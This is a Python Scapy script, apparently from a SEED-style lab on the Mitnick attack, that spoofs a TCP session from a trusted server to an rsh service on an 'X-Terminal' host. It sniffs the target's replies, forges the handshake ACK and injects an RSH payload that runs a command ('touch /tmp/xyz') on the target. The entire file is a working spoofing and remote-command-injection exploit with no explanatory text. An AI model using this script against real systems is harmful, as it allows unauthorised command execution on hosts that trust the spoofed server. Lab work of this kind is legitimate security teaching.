#!/usr/bin/env python3
from scapy.all import IP, TCP, Raw, send, sniff
from random import getrandbits

x_ip = "10.9.0.5"              # X-Terminal
x_port = 514                   # Port number used by X-Terminal

srv_ip = "10.9.0.6"            # The trusted server
srv_port = 1023                # Port number used by the trusted server

# Filter for sniffer
myFilter = 'tcp src port 514 && (not ether host 02:42:f7:8f:12:53)'

# Initialize a sequence number
seq_num = getrandbits(32)

def spoof_rply(pkt):
    global seq_num
    
    # Determine TCP length
    TCPLen = len(pkt[TCP].payload)

    # Construct payload
    myLoad = '1024\x00seed\x00seed\x00touch /tmp/xyz\x00'
    
    # If it is a SYN+ACK packet, spoof an ACK reply and establish RSH connecction
    if pkt[TCP].flags == 'SA':
        ack_no = pkt[TCP].seq + 1
        send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='A', seq = seq_num, ack = ack_no), verbose=0)
        print("connection established...")
        
        # Send the RSH payload
        send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='PA', seq = seq_num, ack = ack_no) / Raw(load = myLoad), verbose=0)
        # update sequence number to next value
        seq_num += len(myLoad)
        print("RSH payload sent...")
        
    # If it is a FIN packet, close the connection
    elif 'F' in pkt[TCP].flags: 
        ack_no = pkt[TCP].seq + 1
        send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='FA', seq = seq_num, ack = ack_no), verbose=0)    
        # update sequence number to next value        
        seq_num += 1           
        print("connection termination requested...")

    # If it is a PSH/ACK packet, acknowledge receipt of packet and data
    elif 'P' in pkt[TCP].flags:
        ack_no = pkt[TCP].seq + TCPLen
        send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='A', seq = seq_num, ack = ack_no), verbose=0)
        print("data received...")
       
    # If it is an ACK packet, do nothing
    elif pkt[TCP].flags == 'A':
        pass
        
def main():
    global seq_num
    # Spoof a SYN packet
    send(IP(src = srv_ip, dst = x_ip) / TCP(sport = srv_port, dport = x_port, flags='S', seq = seq_num), verbose=0)
    # update sequence number to next value
    seq_num += 1
    print("sent SYN packet")

    # Listen for replies and respond
    sniff(iface = 'br-7ef88ab00fc9', filter = myFilter, prn=spoof_rply)


if __name__ == '__main__':
    main()
